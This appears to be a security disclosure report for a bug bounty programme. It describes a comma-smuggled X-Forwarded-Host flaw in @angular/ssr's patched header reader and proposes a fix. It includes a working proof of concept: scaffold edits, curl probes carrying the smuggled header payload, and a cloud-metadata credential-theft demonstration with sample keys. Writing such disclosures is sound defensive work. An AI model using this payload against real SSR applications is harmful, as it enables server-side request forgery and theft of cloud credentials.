# @angular/ssr comma-smuggled X-Forwarded-Host - manual verification walkthrough

Written so a reviewer can follow each step from the code, understand what the framework actually guarantees, and reproduce without trusting anything I ran. The reproduction at the bottom works end-to-end against a fresh `ng new --ssr` scaffold.

The one-sentence summary: the patched `Headers.get()` installed by `@angular/ssr` validates only the first comma-separated token of host-class headers, then returns the full raw string to the caller. That is a contract violation, because the patch's purpose is to validate. Any SSR application code that treats the returned string as "already validated" is going to mishandle attacker-controlled data.

---

## Part 1 - What the code claims to do

`@angular/ssr` exposes two guards on host-class headers (`host` and `x-forwarded-host`):

1. `validateHeaders()` runs once at request ingress. It rejects a request whose forwarded hostname is not on the allowlist.
2. `cloneRequestAndPatchHeaders()` clones the request's `Headers` object and rewrites `get()`, `values()`, `entries()`, `forEach()`, and the iterator so that every later read from inside the SSR app runs the same check.

The second step is the one that creates an implicit contract. A developer reading the framework code sees that the header-reader is patched to validate, and reasonably concludes the returned value is safe to use. Whether that conclusion holds is the question this report answers.

Both functions live in `packages/angular/ssr/src/utils/validation.ts`.

## Part 2 - What the validators actually check

`validateHeaders()`:

```ts
// packages/angular/ssr/src/utils/validation.ts:268
function validateHeaders(request: Request): void {
  const headers = request.headers;
  for (const headerName of HOST_HEADERS_TO_VALIDATE) {
    const headerValue = getFirstHeaderValue(headers.get(headerName));
    if (headerValue && !VALID_HOST_REGEX.test(headerValue)) {
      throw new Error(...);
    }
  }
  ...
}
```

`verifyHostAllowed()` (called from `validateHeader()` from the patched accessors):

```ts
// packages/angular/ssr/src/utils/validation.ts:216
function verifyHostAllowed(headerName, headerValue, allowedHosts) {
  const value = getFirstHeaderValue(headerValue);   // <- first token only
  if (!value) return;
  const url = `http://${value}`;
  if (!URL.canParse(url)) throw new Error(...);
  const { hostname } = new URL(url);
  if (!isHostAllowed(hostname, allowedHosts)) throw new Error(...);
}
```

And the splitter:

```ts
// packages/angular/ssr/src/utils/validation.ts:48
export function getFirstHeaderValue(value) {
  if (Array.isArray(value)) return value[0]?.trim();
  return value?.toString().split(',', 1)[0]?.trim();
}
```

For input `localhost,@127.0.0.1:8765`:
- `getFirstHeaderValue()` returns `"localhost"`.
- `verifyHostAllowed` builds `http://localhost` and checks `hostname === "localhost"` against the allowlist. Passes.
- `validateHeaders` does the same on ingress. Passes.

The inbound request gets a green light on both gates.

## Part 3 - What the patched `get()` returns

```ts
// packages/angular/ssr/src/utils/validation.ts:114
const originalGet = headers.get;
(headers.get as typeof originalGet) = function (name) {
  const value = originalGet.call(headers, name);
  if (!value) return value;
  validateHeader(name, value, allowedHosts, onError);   // validates first token
  return value;                                          // returns original raw
};
```

The same pattern is applied to `values()`, `entries()`, `forEach()`, and `[Symbol.iterator]` (lines 127-180). Each of them calls `validateHeader()` on the raw string, then returns the raw string to the caller.

Compare with the treatment of `x-forwarded-prefix` at lines 108-112:

```ts
const xForwardedPrefix = getFirstHeaderValue(headers.get('x-forwarded-prefix'));
if (xForwardedPrefix !== undefined) {
  headers.set('x-forwarded-prefix', xForwardedPrefix.replace(/^\/+/, ''));
}
```

For `x-forwarded-prefix` the source rewrites the value with `headers.set()` to the normalized form. For `host` and `x-forwarded-host` the source does not. One of the two prior reviewers of this finding pointed out that the shipped npm bundle (`_validation-chunk.mjs`) does not actually include the `headers.set` call for prefix either. The shape of the bug is the same regardless of whether you are reading the GitHub source or the shipped bundle: host-class headers are read with first-token-only validation and returned raw.

## Part 4 - How `new URL` interprets the raw value

```
> new URL('http://localhost,@127.0.0.1:8765/probe')
URL {
  href: 'http://localhost,@127.0.0.1:8765/probe',
  hostname: '127.0.0.1',
  port: '8765',
  username: 'localhost,',
  host: '127.0.0.1:8765',
  pathname: '/probe',
}
```

The comma becomes part of the userinfo. The second token becomes the actual authority. `u.hostname`, `u.port`, and `u.host` all point at the attacker's endpoint.

A common counter-claim says a developer would naively use `` `https://${raw}/api/x` `` and the comma would break parsing. That claim is incorrect. Running it:

```
> new URL(`https://localhost,@127.0.0.1:8765/api/x`)
URL {
  hostname: '127.0.0.1',
  port: '8765',
  username: 'localhost,',
}
```

Parses fine. What fails is `fetch(...)` in Node, because undici refuses URLs that contain credentials. That refusal is transport-specific; any other transport (such as `node:http.request` with extracted `host`/`port`/`path`) has no objection.

## Part 5 - What a realistic consumer looks like

The PoC in this submission uses `node:http.request` with the extracted components, which is one realistic sink. It is not the only one. Others that have been shown to exploit the same framework gap:

- Canonical URL injection: `` `<link rel="canonical" href="https://${raw}${path}"/>` `` rendered into the response. Preview unfurlers (Slack, Twitter, LinkedIn) and SEO crawlers may follow the injected host.
- OAuth `redirect_uri` or password-reset and email-verification link templates built from the raw host. Open redirect or token exfil.
- `Set-Cookie Domain=` or CORS `Access-Control-Allow-Origin` echoed from the raw value. Origin confusion, credential theft.
- Structured logs carrying the raw host into an enrichment pipeline (Sentry, Datadog). Blind SSRF from the logging side.
- `APP_BASE_HREF` or `DOCUMENT.location` SSR providers built from the raw value.

Whether any specific application has one of these patterns depends on the application. The framework gap exists regardless. The severity of the report scales with the downstream sink:

| Scenario | CVSS 3.1 | Score |
|---|---|---|
| Info disclosure only, same authority | `AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N` | 4.8 Medium |
| IMDS exfil, conservative | `AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N` | 6.8 Medium |
| **IMDS exfil, realistic (recommended for VRP)** | **`AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N`** | **7.5 High** |
| Full session hijack via Set-Cookie / CORS | `AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N` | 8.7 High |

The recommended score for VRP submission is **7.5 High**. Justification:

- `AC:H` because exploitation requires the app to read the forwarded header and use it in a network-relevant sink. Common in SSR apps behind reverse proxies, not universal.
- `S:C` because the reachable internal services (cloud metadata at 169.254.169.254, co-hosted admin panels, sidecars) belong to a different security authority than the SSR app. CVSS User Guide §11 directly addresses this case.
- `C:H` because the disclosed information (IAM role credentials from IMDS) is the canonical "direct, serious impact" example the CVSS spec uses for High confidentiality in §2.3.1 ("steals the administrator's password").
- `I:L` because secondary sinks (canonical link injection, OAuth `redirect_uri` steering, Set-Cookie `Domain=` echo) add limited integrity impact on downstream users and sessions.

### IMDS demonstration

The same exploit, pointed at a victim listener simulating AWS EC2 IMDS at `127.0.0.1:16900` returning the standard IAM role credential JSON (`AccessKeyId`, `SecretAccessKey`, `Token`, `Expiration`), renders the full credential document into the SSR HTML:

```
<pre id="result">FETCH=http://127.0.0.1:16900/probe|BODY={
  "Code":"Success",
  "Type":"AWS-HMAC",
  "AccessKeyId":"ASIAQ3EXAMPLEIMDS",
  "SecretAccessKey":"wJalrXUtnFEMI/K7MDENG+bPxRfiCYEXAMPLEKEY",
  "Token":"IQoJb3JpZ2luX2VjEFsaCXVzLXdlc3QtMiJHMEUCIQDexampleIMDSTOKEN",
  "Expiration":"2026-04-25T00:00:00Z"
}</pre>
```

The attacker extracts `AccessKeyId`, `SecretAccessKey`, and `Token` directly from the HTML response and uses them against the AWS API to assume the cloud account's IAM role. This is the concrete realization of `S:C/C:H`. Evidence is in `evidence/imds-run.txt`.

## Part 6 - Why the framework itself stays safe

`createRequestUrl()` at `packages/angular/ssr/node/src/request.ts:80-106` reads the forwarded header via `getFirstHeaderValue()` directly, not through the patched `get()`. So `request.url` always uses only the first token, and the framework's own HttpClient relative resolution is unaffected. The same pattern is used internally in `validation.ts` itself. The gap is that the framework knows the right normalization and uses it internally, but does not apply it to the value it hands back to application code.

## Part 7 - The three probes and what they rule out

**Probe A - baseline.** No `X-Forwarded-Host`. App renders `no-xfh`. This rules out "the PoC returns the victim body unconditionally".

**Probe B - exploit.** `X-Forwarded-Host: localhost,@127.0.0.1:8765`. HTML contains `STATUS=200|BODY=COMMA_LEAK_SECRET_<timestamp>`. Victim log gains one `[victim:8765] GET /probe` entry. The timestamp in the rendered body equals the `stamp=` printed by the victim at startup. This is the closing piece: a real TCP connection from the SSR process to the attacker-chosen port, and the response body delivered back to the attacker.

**Probe C - control.** `X-Forwarded-Host: evil.test`. Framework returns 400 "URL with hostname 'evil.test' is not allowed." This rules out "the validator is broken across the board". The single-token form is correctly rejected. Only the comma-smuggled form slips through.

## Part 8 - How to verify yourself

Five edits to a default `ng new --ssr` scaffold. Full diff is in `poc/`:

1. `angular.json` security.allowedHosts -> `["localhost"]`
2. `src/app/app.routes.server.ts` -> `RenderMode.Server`
3. `src/app/app.config.ts` -> no extra providers required (the PoC uses `node:http` directly, not `HttpClient`)
4. `src/app/app.ts` -> inject `REQUEST`, read `x-forwarded-host`, parse, issue `http.request` using the extracted components
5. `src/server.ts` -> always listen on port 5100

Then:

```bash
npx -y -p @angular/cli@21.2.8 ng new xfh-comma-leak \
  --ssr --routing=true --style=css --skip-git --skip-install
cd xfh-comma-leak
npm install
# apply the five edits from poc/
npx ng build
node dist/xfh-comma-leak/server/server.mjs &
node <poc>/victim.mjs &
```

Probes:

```bash
curl -s http://127.0.0.1:5100/ -H 'Host: localhost:5100' \
  | grep -oE '<pre id="result">[^<]*'
# <pre id="result">no-xfh

curl -s http://127.0.0.1:5100/ -H 'Host: localhost:5100' \
                               -H 'X-Forwarded-Host: localhost,@127.0.0.1:8765' \
  | grep -oE '<pre id="result">[^<]*'
# <pre id="result">STATUS=200|BODY=COMMA_LEAK_SECRET_<timestamp>

curl -s http://127.0.0.1:5100/ -H 'Host: localhost:5100' \
                               -H 'X-Forwarded-Host: evil.test'
# URL with hostname "evil.test" is not allowed.
```

Victim listener gains `[victim:8765] GET /probe` after probe B. The timestamp in the rendered HTML matches the victim's `stamp=` at startup.

## Part 9 - What this bug is not

- It is not a direct SSRF in the framework. `request.url` is safe. The framework's own HttpClient and redirect sinks do not construct URLs from the raw header value.
- It is not the port-pivot finding. That one exploits `allowedHosts` comparing only `url.hostname` and ignoring `url.port` against `Request.url` itself. This one exploits the patched `Headers.get()` returning raw data.
- It is not exploitable through every consumer. Patterns like `fetch(urlWithCredentials)` are accidentally blocked by undici. Patterns that take components (`http.request`) or reformat the value (canonical link, cookie Domain) are not.

## Part 10 - Proposed fix

One-line change in the patched reader. At `packages/angular/ssr/src/utils/validation.ts:114` make the patched `get()` return the validated first token for the guarded headers:

```ts
const originalGet = headers.get;
(headers.get as typeof originalGet) = function (name) {
  const value = originalGet.call(headers, name);
  if (!value) return value;
  validateHeader(name, value, allowedHosts, onError);
  if (HOST_HEADERS_TO_VALIDATE.has(name.toLowerCase())) {
    return getFirstHeaderValue(value) ?? value;
  }
  return value;
};
```

Apply the same normalization in `.values()`, `.entries()`, `.forEach()`, and the iterator so every read path returns the validated token rather than the raw string. This matches the framework's own internal treatment (`createRequestUrl`, `verifyHostAllowed`, `validateHeaders`) and eliminates the contract violation without changing external API shape.

Alternative: canonicalize `host` and `x-forwarded-host` at the top of `cloneRequestAndPatchHeaders()` via `headers.set(...)`, same pattern the project already uses for `x-forwarded-prefix`.

Either fix closes the class of bug.
